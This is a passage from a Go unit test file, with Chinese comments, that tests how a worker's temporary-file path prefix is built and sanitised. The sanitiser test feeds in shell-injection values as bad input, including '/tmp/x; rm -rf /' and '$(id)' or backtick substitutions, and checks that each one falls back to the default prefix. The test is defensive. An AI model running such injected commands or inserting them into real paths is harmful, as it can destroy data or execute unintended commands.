	mock.mu.Lock()
	outer = mock.lastOuter
	mock.mu.Unlock()
	if !strings.Contains(outer, "base64 -d > /tmp/.artex_") ||
		strings.Contains(outer, "/tmp/.artex_7_42_") {
		t.Fatalf("默认前缀异常: %q", outer)
	}
}

// TestTmpPrefixSanitize:非法前缀（含 sh 元字符/非绝对路径）一律回落默认。
func TestTmpPrefixSanitize(t *testing.T) {
	if got := WorkerTmpPrefix(7, 42); got != "/tmp/.artex_7_42_" {
		t.Fatalf("WorkerTmpPrefix = %q", got)
	}
	for _, bad := range []string{"", "rel/path", "/tmp/x; rm -rf /", "/tmp/x$(id)", "/tmp/x`id`", "/tmp/x y", `"/tmp/x"`} {
		if got := sanitizeTmpPrefix(bad); got != defaultTmpPrefix {
			t.Fatalf("sanitizeTmpPrefix(%q) = %q, want 默认前缀", bad, got)
		}
	}
	if got := sanitizeTmpPrefix("/tmp/.artex_1_2_"); got != "/tmp/.artex_1_2_" {
		t.Fatalf("合法前缀被误杀: %q", got)
	}
}
